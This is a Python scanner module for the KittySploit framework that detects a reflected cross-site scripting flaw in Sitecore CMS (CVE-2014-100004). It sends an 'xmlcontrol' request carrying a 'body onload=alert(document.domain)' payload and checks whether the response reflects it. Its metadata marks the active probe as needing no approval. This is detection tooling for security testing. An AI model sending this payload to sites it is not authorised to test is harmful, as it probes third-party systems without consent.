#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sitecore CMS contains a cross-site scripting vulnerability via the "special way" of displaying XML Controls di."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sitecore CMS - Cross-Site Scripting Detection',
        'description': 'Sitecore CMS contains a cross-site scripting vulnerability via the "special way" of displaying XML Controls directly, which allows for a Cross Site Scripting Attack.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'xss', 'sitecore', 'cms', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://vulners.com/securityvulns/SECURITYVULNS:DOC:30273',
            'https://web.archive.org/web/20151016072340/http://www.securityfocus.com/archive/1/530901/100/0/threaded',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-100004',
        ],
        'cve': 'CVE-2014-100004',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?xmlcontrol=body%20onload=alert(document.domain)', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<body onload=alert(document.domain) />',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Sitecore CMS - Cross-Site Scripting detected",
                path='/?xmlcontrol=body%20onload=alert(document.domain)',
            )
            return True
        return False

